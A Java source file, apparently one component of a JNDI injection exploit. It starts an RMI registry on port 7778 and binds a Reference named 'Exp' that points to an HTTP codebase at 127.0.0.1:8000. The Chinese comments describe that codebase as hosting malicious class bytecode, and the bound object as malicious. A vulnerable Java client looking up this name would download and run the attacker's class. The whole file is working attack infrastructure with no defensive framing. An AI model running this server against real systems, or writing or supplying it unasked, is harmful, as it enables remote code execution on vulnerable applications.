package com.rain;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws Exception{
        //System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

        // RMI Registry 端口
        Registry registry = LocateRegistry.createRegistry(7778);
        // 托管恶意类字节码的HTTP 服务器
        Reference reference = new Reference("Exp","com.rain.Exp","http://127.0.0.1:8000/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);

        // 绑定一个恶意的Remote对象到RMI服务
        registry.bind("Exp",wrapper);
    }

}